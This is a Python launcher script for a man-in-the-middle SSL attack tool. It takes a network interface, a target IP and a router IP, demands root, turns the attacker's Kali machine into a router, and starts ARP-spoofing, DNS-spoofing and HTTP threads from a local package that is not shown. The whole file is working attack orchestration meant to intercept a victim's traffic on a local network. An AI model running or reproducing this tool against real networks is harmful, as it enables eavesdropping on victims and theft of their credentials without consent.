#!/usr/bin/env python3

import argparse
import os
import sys
import threading
from stage import mitm, router, dns, http

parser = argparse.ArgumentParser(description="MITM SSL attack tool")
parser.add_argument("--iface", help="Interface to use", required=True)
parser.add_argument("--target", help="Target IP to attack", required=True)
parser.add_argument("--router", help="Router IP (used for MITM ARP spoofing)",
                    required=True)
opts = parser.parse_args()

if os.getuid() != 0:
    print('Must be run as root')
    sys.exit(1)

def main():
    # Let's make our kali attacker machine a router by executing some shell
    # commands.
    router.run()

    # Prepare the threads
    t_http = threading.Thread(target=http.run, args=(opts.iface,))
    t_mitm = threading.Thread(target=mitm.run, args=(opts.router, opts.target,
                                                     opts.iface))
    t_dns = threading.Thread(target=dns.run, args=(opts.router, opts.target,
                                                   opts.iface))

    # Launch them
    t_mitm.start()
    t_dns.start()
    t_http.start()

    print("Attack started!")

if __name__ == '__main__':
    main()
